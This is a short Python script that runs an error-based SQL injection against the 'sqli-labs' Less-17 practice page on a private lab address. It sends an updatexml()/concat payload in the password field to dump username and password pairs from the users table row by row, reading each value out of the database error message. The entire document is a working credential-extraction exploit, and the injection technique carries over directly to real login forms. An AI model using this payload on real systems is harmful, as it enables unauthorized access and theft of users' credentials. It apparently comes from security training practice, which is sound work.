#coding:utf-8
import requests

valuelen = 100

def getPostData(i):
    postdata = "123' or updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit %s,1),0x7e),1) -- "%i
    postdata = {"uname":"admin", "passwd":postdata}
    return postdata

url = "http://10.0.2.15/sqli/Less-17/"
for i in range(0,valuelen):
    res = requests.post(url, data = getPostData(i))
    if "error" in res.content:
	print(res.content.split('~')[1])
    else:
	break

